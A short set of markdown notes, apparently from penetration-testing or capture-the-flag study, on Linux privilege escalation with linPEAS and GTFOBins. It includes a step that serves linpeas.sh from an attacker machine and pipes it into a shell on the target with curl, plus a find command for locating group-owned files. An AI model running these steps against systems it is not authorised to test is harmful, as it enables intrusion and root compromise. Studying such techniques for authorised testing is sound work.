# Privilege Escalation:

_______________________________________________________________________________
## linPeas:
  1. wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

  2. Once the linpeas.sh is downloaded, we can make our own webserver for the target machine to access. That way we can run the
     linpeas script in the target machine:
        python3 -m http.server 80
  3. From the target machine, we can download the linpeas script from the attacker machine's web server with a curl command:
        curl http://<Your_Kali_VM_IP>/linpeas.sh | sh

  4. make sure to modify permissions to allow us to execute linpeas.sh:
    chmod +x linpeas.sh
  5. GTFOBins: after linpeas has found a PrivEsc vulnerability, GTFOBins can be used to find out how to exploit the PrivEsc vulnerability:
  https://gtfobins.github.io/

## checking groups for editable binaries:
1. use 'id' command to check which groups the user is a part of. 
2. once we find the groups the a user is a part of, we can use 
    find / -group users -type f 2>/dev/null
to find the files that are owned by the group/user
_______________________________________________________________________________

